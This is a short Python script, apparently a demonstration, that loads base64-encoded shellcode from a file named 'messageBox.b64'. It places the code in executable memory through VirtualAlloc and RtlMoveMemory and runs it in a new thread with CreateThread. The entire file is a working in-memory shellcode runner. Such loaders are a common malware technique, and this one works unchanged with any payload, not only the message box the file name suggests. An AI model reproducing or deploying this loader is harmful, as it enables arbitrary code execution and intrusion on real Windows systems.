#!/usr/bin/python
import ctypes
import base64

# decode the shellcode from base64 
file = open("shellcodes/messageBox.b64", "r") 
shell_b64 = file.read() 
shellcode = bytearray(base64.b64decode(shell_b64))

ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),
                                        ctypes.c_int(len(shellcode)),
                                        ctypes.c_int(0x3000),
                                        ctypes.c_int(0x40))

buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)

ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),
                                    buf,
                                    ctypes.c_int(len(shellcode)))

ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),
                                        ctypes.c_int(0),
                                        ctypes.c_int(ptr),
                                        ctypes.c_int(0),
                                        ctypes.c_int(0),
                                        ctypes.pointer(ctypes.c_int(0)))

ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))